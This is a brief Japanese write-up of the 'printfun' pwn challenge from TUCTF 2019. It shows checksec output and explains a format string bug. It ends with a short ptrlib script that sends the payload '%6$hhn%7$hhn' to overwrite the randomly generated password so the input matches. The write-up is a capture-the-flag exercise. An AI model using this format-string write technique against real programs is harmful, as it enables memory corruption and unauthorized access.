# [pwn 494pts] printfun - TUCTF 2019
SSPが無効です。
```
$ checksec -f printfun
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   80 Symbols     No       0               6       printfun
```
FSBがあります。ランダムに生成されたパスワードと入力が一致すればフラグが貰えます。
RELROが有効なのでパスワードの方を書き換えました。
```python
from ptrlib import *

sock = Process("./printfun")

sock.sendafter("? ", "%6$hhn%7$hhn")

sock.interactive()
```

# 感想
簡単ですね。